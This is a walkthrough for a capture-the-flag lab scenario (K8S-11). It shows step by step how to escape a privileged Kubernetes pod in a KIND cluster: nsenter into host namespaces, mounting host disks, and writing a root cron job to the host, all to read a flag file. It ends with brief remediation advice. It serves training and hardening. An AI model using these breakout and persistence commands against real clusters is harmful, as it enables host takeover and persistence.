# K8S-11: Privileged Container Breakout

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-11 |
| 名称 | Privileged Container Breakout |
| 技术/CVE | N/A (privileged pod) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |
| 集群 | cve-k8s-11-privileged |

## 场景概述

1. Pod `privileged-pod` runs with `privileged: true` (all capabilities, no isolation)
2. The pod also runs with `hostPID: true`
3. Use `nsenter` to enter the host namespace and read the flag
4. Alternative: mount the host filesystem and read the flag directly

## 前置知识

- kubectl access to KIND cluster `cve-k8s-11-privileged`
- Pod name: `privileged-pod` (alpine image)
- Tools inside pod: `nsenter`, `mount`, `cat`

## 利用步骤

### Step 1: Initial Access
Exec into the privileged pod:

```bash
kubectl exec -it privileged-pod -- sh
```

### Step 2: Verify Privileged Mode
```bash
# Check capabilities
cat /proc/self/status | grep CapEff
# Should show all capabilities (full set)

# Check if we can see devices
ls -la /dev/
# Expected: full device list (not filtered)

# Check privileged flag
cat /proc/self/status | grep CapEff | awk '{print $2}' | while read cap; do
    capsh --decode=$cap 2>/dev/null || true
done
# Should show all capabilities including: CAP_SYS_ADMIN, CAP_NET_ADMIN, etc.
```

### Step 3: Breakout via nsenter
Use `nsenter` to enter the host namespace (PID 1):

```bash
# Enter the host mount, PID, network, and IPC namespaces
nsenter --mount --uts --ipc --net --pid --target 1

# Now you are in the host's root namespace
cat /host-flag/flag.txt
# Expected: flag{k8s-11-*}

# Or run a single command
nsenter --target 1 --mount --pid -- cat /host-flag/flag.txt
```

### Step 4: Alternative -- Mount Host Filesystem
```bash
# Create a mount point
mkdir -p /mnt/host

# Mount the host root filesystem via the privileged device access
mount /dev/sda1 /mnt/host 2>/dev/null || \
mount /dev/vda1 /mnt/host 2>/dev/null || \
mount /dev/vda /mnt/host 2>/dev/null

# List disks to find the correct device
lsblk
fdisk -l 2>/dev/null || cat /proc/partitions
```

### Step 5: Alternative -- Write to Host cron
```bash
# With privileged access, write a cron job to the host
echo "* * * * * root cat /host-flag/flag.txt > /tmp/flag_out" > /tmp/cronjob
cp /tmp/cronjob /etc/cron.d/flag-job 2>/dev/null || \
nsenter --target 1 --mount -- sh -c "echo '* * * * * root cat /host-flag/flag.txt > /tmp/flag_out' > /etc/cron.d/flag-job"
```

### Step 6: Capture Flag
- Flag format: `flag{k8s-11-*}`
- Flag location: `/host-flag/flag.txt` on the KIND node (reachable only from the host namespace)
- Access methods:
  - nsenter: `nsenter --target 1 --mount -- cat /host-flag/flag.txt`
- Expected output: `flag{k8s-11-default}` (or custom value from `CVE_FLAG`)

## 验证命令

```bash
# Verify the scenario is deployed and running
kubectl get pod privileged-pod
# Expected: NAME             READY   STATUS    RESTARTS   AGE
#           privileged-pod   1/1     Running   0          ...

# Verify privileged mode
kubectl exec privileged-pod -- cat /proc/self/status | grep CapEff

# Quick exploit verification (single line)
kubectl exec privileged-pod -- nsenter --target 1 --mount -- cat /host-flag/flag.txt
```

## Flag

- Flag 位置：`/host-flag/flag.txt` on the KIND node (not mounted into the pod; host access required)

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Pod securityContext and Linux namespaces |
| 侦察与前置条件 | Privileged pod capability and host mount inspection |
| 核心漏洞与利用 | Create or use a privileged container |
| 权限、横向或影响 | Host namespace/filesystem breakout |
| 验证 | Read the host flag from the privileged context |

## 修复建议

升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
